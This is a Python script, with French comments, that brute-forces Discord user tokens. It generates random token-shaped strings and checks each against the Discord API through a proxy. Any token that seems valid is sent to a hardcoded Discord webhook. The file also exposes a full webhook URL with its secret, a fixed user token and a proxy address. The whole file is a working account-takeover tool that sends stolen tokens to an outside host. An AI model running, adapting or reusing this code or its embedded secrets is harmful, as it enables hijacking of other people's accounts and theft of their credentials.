import hashlib
import json
import random
import string
import time

import requests

url = "https://discord.com/api/v6"
webhook_url = 'https://discord.com/api/webhooks/1065585253034500116/SofKqPBHwYq2707Fqxr5p4yugEhftHpd7M3YPv45KQlAimn91BKYnR0J2kr5SBx_iZG8'  # Insérez ici l'URL de votre webhook Discord


def send_webhook(content, webhook_url):
    headers = {'Content-Type': 'application/json'}
    payload = {'content': content}
    response = requests.post(webhook_url, json=payload, headers=headers)
    if response.status_code == 204:
        print('Webhook envoyé avec succès')
    else:
        print('Echec lors de l\'envoi du webhook : ', response.status_code)


def generate_code(length):
    letters_and_digits = string.ascii_letters + string.digits
    result = ''.join(random.choice(letters_and_digits) for i in range(length))
    return result


def generate_string():
    first_part = generate_code(24)
    second_part = generate_code(6)
    third_part = generate_code(38)
    return first_part + "." + second_part + "." + third_part


generated_string = generate_string()
count = 0
while True:
    count += 1
    generatedToken = generate_string()
    if count == 15:
        generatedToken = "NjMwODE1MDc3NjQ5MzUwNjk2.G9BWSV.3pvef96Idamr9PQDd1nvHMCJBN-eQ1MqLODG3E"

    headers = {
        "Authorization": generatedToken,
        "Content-Type": "application/json"
    }

    prox = {
        "http": "135.125.244.133:42165"
    }

    guilds = requests.get(
        f"{url}/users/@me/guilds",
        headers=headers, proxies=prox
    )
    if guilds.status_code != 401:
        print("trouvé ------> " + generatedToken + " status= " + str(guilds.status_code))
        content = generatedToken
        send_webhook(content, webhook_url)
    else:
        print("mauvais token -> " + generatedToken + "--->" + str(guilds.status_code))

    time.sleep(1 / 40)
